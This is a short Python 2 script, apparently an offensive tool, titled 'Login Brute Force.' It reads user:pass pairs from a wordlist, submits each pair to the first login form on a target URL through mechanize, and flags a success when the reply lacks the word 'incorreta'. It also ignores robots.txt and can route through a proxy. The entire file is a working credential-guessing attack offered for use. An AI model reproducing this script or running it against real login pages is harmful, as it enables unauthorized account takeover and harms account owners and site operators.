import mechanize
import time
import argparse
import socket
import sys
import time
import timeit
from sys import stdout
from ftplib import FTP


class textColor:
    OKGREEN = '\033[1m\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'


#Description
parser = argparse.ArgumentParser(description='Login Brute Force.')

#Constants
TIMEOUT=1

#Arguments
parser.add_argument('-H','--host',required=True, help='[STRING] Target Address. Single Scan')
parser.add_argument('-w','--wordlist',required=True, help='[STRING] Wordlist with user:pass')
parser.add_argument('-x','--proxy',help='[STRING] Proxy address. ip:port')
parser.add_argument('-uf','--userfield',required=True,help='User Field')
parser.add_argument('-pf','--passfield',required=True,help='Pass Field')
parser.add_argument('-t','--timeout',help='[INT] Time to wait on a requisition', default=TIMEOUT)
parser.add_argument('-d','--delay',help='[INT]Delay on scan. Works only in Scan List')

args = parser.parse_args()

br = mechanize.Browser()

br.set_handle_robots(False)


def loginBrute():
  #Dictionary. Must be: user:pass
  fd = open(args.wordlist, "r")
  for line in fd.readlines():
    user_pass = line.strip().split(':')
    try:
      br.open
      br.open(args.host)
      response = br.response()
      br.select_form(nr=0)
      br[args.userfield] = user_pass[0]
      br[args.passfield] = user_pass[1]
      results = br.submit().read()
      if results.find("incorreta") != -1:
          print textColor.FAIL+"[ X ] User %s  Pass %s" % (user_pass[0], user_pass[1]+textColor.ENDC)
      else:
          print textColor.OKGREEN+"[ OK ] User %s  Pass %s" % (user_pass[0], user_pass[1])+textColor.ENDC
          op = raw_input(textColor.OKGREEN+'User/Pass Found. Do you want continue crack ? [y/n]'+textColor.ENDC)
          if op =="n":
            break

    except  Exception, e:
        print str(e)
        break


def main():
 if args.wordlist:
   loginBrute()
        
if __name__ == "__main__":
  main()  
